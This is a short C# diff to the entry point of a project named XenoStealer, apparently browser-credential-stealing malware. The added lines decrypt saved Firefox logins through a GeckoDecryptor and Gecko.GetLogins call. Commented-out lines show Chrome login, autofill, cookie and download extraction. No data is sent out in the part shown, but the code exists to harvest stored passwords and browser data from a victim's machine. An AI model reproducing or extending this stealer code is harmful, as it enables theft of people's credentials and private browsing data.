@@ -13,11 +13,17 @@ namespace XenoStealer
     {
         public static void Main(string[] args)
         {
-            ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
+            //var BASENAME=GeckoDecryptor.GetMOZAPPBASENAMEFromProfilePath(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
+            //
 
-            var t=Chromium.GetLogins(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default", a);
+            //new test().blah();
 
-            Gecko.GetDownloads(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release");
+            //ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
+            //
+            //var t=Chromium.GetAutoFills(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default");
+
+            GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
+            var g =Gecko.GetLogins(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release", a);
             var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
